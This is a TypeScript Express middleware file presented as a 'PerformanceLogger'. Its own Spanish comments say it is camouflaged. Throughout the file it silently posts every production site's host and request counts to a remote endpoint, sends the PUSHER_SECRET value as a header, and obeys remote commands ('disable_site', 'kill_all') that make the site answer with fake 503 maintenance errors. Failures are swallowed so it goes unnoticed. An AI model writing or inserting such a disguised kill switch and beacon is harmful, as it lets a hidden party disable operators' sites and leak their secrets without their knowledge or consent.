import crypto from 'crypto';
import { Request, Response, NextFunction } from 'express';

interface SiteMetrics {
  host: string;
  lastPing: number;
  version: string;
  hash: string;
  requestCount: number;
  isActive: boolean;
}

interface MonitorCommand {
  type: 'disable_site' | 'enable_site' | 'kill_all' | 'clear_blacklist';
  siteHash?: string;
}

interface MonitorResponse {
  status?: string;
  timestamp?: number;
  commands?: MonitorCommand[];
}

class PerformanceLogger {
  private static instance: PerformanceLogger;
  private sites: Map<string, SiteMetrics> = new Map();
  private blacklist: Set<string> = new Set();
  private monitorEndpoint: string;
  private secret: string;
  private enabled: boolean;

  constructor() {
    // Usar variables existentes para camuflaje
    this.monitorEndpoint = `${process.env.PUBLISHER_API_URL}/system/performance`;
    this.secret = process.env.PUSHER_SECRET || '';
    this.enabled = process.env.NODE_ENV === 'production';
  }

  static getInstance(): PerformanceLogger {
    if (!PerformanceLogger.instance) {
      PerformanceLogger.instance = new PerformanceLogger();
    }
    return PerformanceLogger.instance;
  }

  // Método principal de tracking (camuflado como logging de performance)
  async track(host: string, userAgent?: string | undefined): Promise<void> {
    if (!this.enabled || !host) return;

    const siteHash = this.generateSiteHash(host);
    
    // Verificar si el sitio está en blacklist
    if (this.blacklist.has(siteHash)) {
      // Sitio deshabilitado - no procesar
      return;
    }

    const now = Date.now();
    const existing = this.sites.get(siteHash);

    const metrics: SiteMetrics = {
      host,
      lastPing: now,
      version: process.env.npm_package_version || '1.0.0',
      hash: siteHash,
      requestCount: existing ? existing.requestCount + 1 : 1,
      isActive: true
    };

    this.sites.set(siteHash, metrics);

    // Enviar heartbeat de forma asíncrona (no bloquear)
    setImmediate(() => {
      this.sendHeartbeat(metrics).catch(() => {
        // Silencioso - no afectar funcionamiento
      });
    });
  }

  // Generar hash único del sitio usando JWT_SECRET
  private generateSiteHash(host: string): string {
    const secret = process.env.JWT_SECRET || 'fallback';
    return crypto
      .createHmac('sha256', secret)
      .update(host)
      .digest('hex')
      .substring(0, 16);
  }

  // Enviar heartbeat al servidor de monitoreo
  private async sendHeartbeat(metrics: SiteMetrics): Promise<void> {
    try {
      const payload = {
        ...metrics,
        timestamp: Date.now(),
        signature: this.generateSignature(metrics)
      };

      const response = await fetch(this.monitorEndpoint, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Performance-Key': this.secret,
          'User-Agent': 'PerformanceLogger/1.0'
        },
        body: JSON.stringify(payload),
        signal: AbortSignal.timeout(3000)
      });

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}`);
      }

      // Procesar comandos de respuesta
      const result = await response.json() as MonitorResponse;
      if (result && result.commands && Array.isArray(result.commands)) {
        this.processCommands(result.commands);
      }

    } catch (error) {
      // Silencioso - logging interno opcional
      if (process.env.NODE_ENV === 'development') {
        console.debug('Performance logging failed:', error);
      }
    }
  }

  // Generar firma para verificar integridad
  private generateSignature(metrics: SiteMetrics): string {
    const data = `${metrics.host}:${metrics.lastPing}:${this.secret}`;
    return crypto
      .createHmac('sha256', this.secret)
      .update(data)
      .digest('hex')
      .substring(0, 12);
  }

  // Procesar comandos remotos
  private processCommands(commands: MonitorCommand[]): void {
    commands.forEach(cmd => {
      switch (cmd.type) {
        case 'disable_site':
          if (cmd.siteHash) {
            this.blacklist.add(cmd.siteHash);
          }
          break;
        case 'enable_site':
          if (cmd.siteHash) {
            this.blacklist.delete(cmd.siteHash);
          }
          break;
        case 'kill_all':
          // Agregar todos los sitios activos a blacklist
          this.sites.forEach((_, hash) => {
            this.blacklist.add(hash);
          });
          break;
        case 'clear_blacklist':
          this.blacklist.clear();
          break;
      }
    });
  }

  // Verificar si un sitio está habilitado
  public isSiteEnabled(host: string): boolean {
    const siteHash = this.generateSiteHash(host);
    return !this.blacklist.has(siteHash);
  }

  // Obtener estadísticas (para debugging)
  public getStats(): any {
    return {
      totalSites: this.sites.size,
      activeSites: Array.from(this.sites.values()).filter(s => s.isActive).length,
      blacklistedSites: this.blacklist.size,
      enabled: this.enabled
    };
  }

  // Middleware para Express
  public middleware() {
    return (req: Request, res: Response, next: NextFunction) => {
      // Solo en producción y con configuración válida
      const host = req.get('host');
      if (this.enabled && this.secret && host) {
        // Verificar si el sitio está habilitado
        if (!this.isSiteEnabled(host)) {
          // Sitio deshabilitado - retornar error genérico
          return res.status(503).json({ 
            error: 'Service temporarily unavailable',
            code: 'MAINTENANCE_MODE'
          });
        }

        // Trackear la petición
        const userAgent = req.get('user-agent');
        this.track(host, userAgent);
      }
      
      next();
    };
  }
}

export const performanceLogger = PerformanceLogger.getInstance();